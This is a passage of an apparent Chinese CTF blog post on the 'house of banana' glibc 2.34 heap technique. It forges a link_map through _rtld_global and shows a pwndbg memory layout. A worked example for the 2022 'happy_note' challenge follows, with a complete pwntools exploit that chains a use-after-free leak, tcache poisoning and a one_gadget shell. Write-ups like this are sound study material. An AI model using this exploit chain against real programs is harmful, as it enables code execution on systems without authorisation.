<p>l-&gt;addr其实就是我们伪造的link_map开始的位置，个人喜欢将这里写为0，然后将l_info[26]写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为ptr_a,这个就会给arry赋值，然后  arry[i] ====&gt;&gt; 就是调用ptr_a +8*i 位置的函数。也就是我们的后门。</p>
<p>提供一个构造的布局，</p>
<p>在fake+0x110写入一个ptr_a，且ptr_a+0x8处有ptr，ptr处写入的是最后要执行的函数地址.</p>
<p>在fake+0x120写入一个ptr，且ptr+0x8处是i*8。</p>
<p>我选择的是fake+0x110写入fake+0x40，在fake+0x48写入fake+0x58，在fake+0x58写入shell</p>
<p>我选择在fake+0x120写入fake+0x48，在fake+0x50处写入8.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel 0x55a656f072a0(fake) 40</span><br><span class="line">00:0000│  0x55a656f072a0 ◂— 0x0       //l_addr</span><br><span class="line">... ↓     4 skipped</span><br><span class="line">05:0028│  0x55a656f072c8 —▸ 0x55a656f072a0 ◂— 0x0    //l_real</span><br><span class="line">06:0030│  0x55a656f072d0 ◂— 0x0</span><br><span class="line">07:0038│  0x55a656f072d8 ◂— 0x41 </span><br><span class="line">08:0040│  0x55a656f072e0 ◂— 0x0</span><br><span class="line">09:0048│  0x55a656f072e8 —▸ 0x55a656f072f8 —▸ 0x7f56e4244cec (execvpe+652) ◂— mov    rdx, r12</span><br><span class="line">0a:0050│  0x55a656f072f0 ◂— 0x8</span><br><span class="line">0b:0058│  0x55a656f072f8 —▸ 0x7f56e4244cec (execvpe+652) ◂— mov    rdx, r12</span><br><span class="line">0c:0060│  0x55a656f07300 ◂— 0xa /</span><br><span class="line">0d:0068│  0x55a656f07308 ◂— 0x0</span><br><span class="line">0e:0070│  0x55a656f07310 ◂— 0x0</span><br><span class="line">0f:0078│  0x55a656f07318 ◂— 0x41</span><br><span class="line">10:0080│  0x55a656f07320 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">17:00b8│  0x55a656f07358 ◂— 0x41</span><br><span class="line">18:00c0│  0x55a656f07360 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">1f:00f8│  0x55a656f07398 ◂— 0x41 </span><br><span class="line">20:0100│  0x55a656f073a0 ◂— 0x0</span><br><span class="line">21:0108│  0x55a656f073a8 ◂— 0x0</span><br><span class="line">22:0110│  0x55a656f073b0 —▸ 0x55a656f072e0  //l_info[26]</span><br><span class="line">23:0118│  0x55a656f073b8 ◂— 0x0</span><br><span class="line">24:0120│  0x55a656f073c0 —▸ 0x55a656f072e8  //l_info[28]</span><br><span class="line">25:0128│  0x55a656f073c8 ◂— 0xa </span><br><span class="line">26:0130│  0x55a656f073d0 ◂— 0x0</span><br><span class="line">27:0138│  0x55a656f073d8 ◂— 0x41</span><br></pre></td></tr></table></figure>

<p>最后我们就是利用onegadget获得shell了。</p>
<p>利用gdb万能必挂点，结合one_gadget工具帮助我们快速找到合适的one_gadget</p>
<p><img src="https://pic3.zhimg.com/80/v2-8e71d13c972fd006acc5279d28cf2ba2_1440w.jpg" alt="img"></p>
<h2 id="一些注意点："><a href="#一些注意点：" class="headerlink" title="一些注意点："></a>一些注意点：</h2><p>因为_rtld_global   这个符号是存在与ld.so文件中，往往出题人不会给出ld.so文件，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本  Glibc-2.34  0ubuntu3.2的可行性。因为2.34主要问题还是在于一些hook函数被禁止，以及对_IO_str_finish、_IO_str_overflow变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位ctfer来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在3.2版本之前，我们依旧可以通过修改vtable劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个hook的符号，而是其他的符号)。house  of kiwi,攻击exit_hook依旧是可以实现，且比较方便的。</p>
<p>后面我这里主要介绍了house of banana,这项技术，依旧是用于3.2，并且向下兼容。简要概括，就是修改第三个节点的l_next为堆地址fake，并在该堆上伪造第四个节点。</p>
<p>伪造link_map</p>
<ol>
<li>*(fake+0x28)=fake。</li>
<li>*(fake +0x48)=fake+0x58, *(fake+0x50) = 0x8</li>
<li>*(fake+0x58) = shell</li>
<li>*(fake+0x110) = fake+0x40</li>
<li>*(fake+0x120) = fake+0x48</li>
<li>(int)*(fake+0x31c) = 0x9</li>
</ol>
<h1 id="例题：巅峰极客2022-happy-note"><a href="#例题：巅峰极客2022-happy-note" class="headerlink" title="例题：巅峰极客2022-happy_note"></a>例题：巅峰极客2022-happy_note</h1><p>程序存在一个可以利用一次的uaf漏洞，对堆大小和数量没有太大限制，所以可以利用常规手法泄露出libcbase和heapbase</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./happy_note&#x27;)</span><br><span class="line">#libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Note size:&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Choose a mode: [1] or [2]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Edit your content:&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Which one do you want to show?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b&#x27;content: &#x27;)</span><br><span class="line">key = u64(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就是一个house of banana攻击</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./happy_note&#x27;)</span><br><span class="line">#libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Note size:&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Choose a mode: [1] or [2]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Edit your content:&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Which one do you want to show?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b&#x27;content: &#x27;)</span><br><span class="line">key = u64(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">edit(7,b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x1f1) + p64(l_next ^ (key + 1)))</span><br><span class="line">add(4,0x1e8,2)</span><br><span class="line">add(5,0x1e8,2)</span><br><span class="line">edit(5,p64(padding) + p64(fake_rtld))</span><br><span class="line"></span><br><span class="line">one = [0xeacec, 0xeacef, 0xeacf2]</span><br><span class="line"></span><br><span class="line">ogg = libcbase + one[0]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0x18</span><br><span class="line">payload += p64(fake_rtld)</span><br><span class="line">payload = payload.ljust(0x38, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x58)</span><br><span class="line">payload += p64(0x8)</span><br><span class="line">payload += p64(ogg)</span><br><span class="line">payload = payload.ljust(0x100, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x40)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(fake_rtld + 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(4, payload)</span><br><span class="line">edit(8, b&#x27;\x00&#x27; * (0x12c - 0x10) + p8(8))</span><br><span class="line">delete(10)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
